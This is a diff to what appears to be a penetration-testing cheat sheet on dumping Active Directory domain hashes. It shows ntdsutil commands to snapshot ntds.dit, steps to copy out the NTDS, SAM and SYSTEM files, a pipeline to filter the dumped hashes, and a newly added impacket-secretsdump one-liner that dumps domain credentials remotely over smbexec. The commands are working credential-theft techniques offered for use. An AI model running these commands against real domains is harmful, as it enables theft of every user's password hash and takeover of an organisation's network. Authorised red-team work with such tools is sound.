@@ -1,6 +1,6 @@
 # Dumping domain hashes
 
-## NTDSutil&#x20;
+## NTDSutil
 
 ```
 powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
@@ -13,7 +13,7 @@ ntdsutil
 > mount {GUID}
 ```
 
-Then browse to the mounted directory in the C:/  and copy out the ntds.dit && SAM & SYSTEM file to your prefered location
+Then browse to the mounted directory in the C:/ and copy out the ntds.dit && SAM & SYSTEM file to your prefered location
 
 To delete the snapshot after:
 
@@ -31,6 +31,12 @@ The tidy up the hashes
 
 ```
 cat myhashes.ntds | grep -v "$:" | grep "status=Enabled" | cut -d'\' -f2 | cut -d"(" -f1
+```
+
+Or you can do it with a 1 liner remotely. but becareful it doesnt crash the connection
+
+```
+impacket-secretsdump -just-dc -user-status -pwd-last-set -history -exec-method smbexec DOMAIN/USER:PASS@IP
 ```
 
 ## crackmapexec
